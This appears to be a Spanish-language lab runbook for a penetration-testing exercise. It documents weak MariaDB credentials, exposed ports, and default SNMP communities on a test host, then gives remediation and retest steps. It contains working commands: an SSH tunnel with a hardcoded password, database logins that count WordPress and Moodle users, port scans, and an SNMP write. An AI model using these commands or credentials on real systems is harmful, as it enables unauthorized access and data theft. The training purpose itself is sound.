# D2–D4 · Configuraciones de M2

## 1. Ficha

| ID | Servicio | Configuración | CWE | CVSS |
|---|---|---|---|---|
| D2 | MariaDB | `wp_user`/`moodle_user` con `wp_pass123` | CWE-521 | ~8.1 |
| D3 | Puertos | 3306/6379/161 expuestos | CWE-284 | ~7.5 |
| D4 | SNMP | `public`/`private` | CWE-306 | ~7.5 |

## 2. Flujo

1. Snapshot M2: `previo-a-M2`.
2. Túnel desde M1 (si no hay pivote):

```bash
sshpass -p 'Admin13.-' ssh -N -L 13306:10.10.10.12:3306 ubuntu@10.10.10.11 &
```

3. D2:

```bash
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' \
  -e 'SHOW DATABASES; SELECT COUNT(*) FROM wordpress.wp_users;'
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' \
  -e 'SELECT COUNT(*) FROM moodle_db.mdl_user;'
```

4. D3:

```bash
nmap -sT -p 3306,6379,161 10.10.10.12
```

5. D4:

```bash
onesixtyone 10.10.10.12 public
snmpwalk -v2c -c public 10.10.10.12 system
snmpset -v2c -c private 10.10.10.12 sysContact.0 s pwned
```

## 3. Resultado esperado

```text
wordpress
moodle_db
12 / 487
6379/tcp open redis
161/udp open snmp
SNMPv2-MIB::sysDescr.0 = ...
```

## 4. Evidencia

- `EV-D2-01`: `SHOW DATABASES` y conteos.
- `EV-D3-01`: `nmap`.
- `EV-D4-01`: `snmpwalk`/`snmpset`.
- `LOG-M2`.

## 5. Impacto y siguiente salto

- Dump de datos de WordPress y Moodle.
- D4 permite lectura/escritura SNMP.
- Credenciales y datos para el informe; no para atacar terceros.

## 6. Remediación

```sql
ALTER USER 'wp_user'@'10.10.10.11' IDENTIFIED BY 'NuevaWP_2026!';
ALTER USER 'moodle_user'@'10.10.10.11' IDENTIFIED BY 'NuevaMoodle_2026!';
```

```bash
sudo ufw allow from 10.10.10.11 to any port 3306 proto tcp
sudo ufw deny 6379/tcp
sudo ufw deny 161/udp
# SNMP: eliminar rocommunity public / rwcommunity private; usar SNMPv3/ACL
```

## 7. Retest

```bash
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' -e 'SELECT 1;'  # denegado
nmap -sT -p 3306,6379,161 10.10.10.12                                             # filtered
snmpwalk -v2c -c public 10.10.10.12 system                                       # falla
```

## 8. EARS

- **REQ-D2-01 (Evento).** CUANDO se valide D2, el laboratorio DEBE capturar `SHOW DATABASES` y los conteos.
- **REQ-D3-01 (Evento).** CUANDO se valide D3, el laboratorio DEBE capturar los puertos abiertos.
- **REQ-D4-01 (Evento).** CUANDO se valide D4, el laboratorio DEBE capturar `snmpwalk` y `snmpset`.
- **REQ-D2D4-02 (Ubicuo).** La remediación DEBE dejar credenciales viejas denegadas y puertos filtrados.

## 9. Checklist

- [ ] Snapshot `previo-a-M2`.
- [ ] D2 dump.
- [ ] D3 puertos.
- [ ] D4 SNMP.
- [ ] Remediación.
- [ ] Retest.
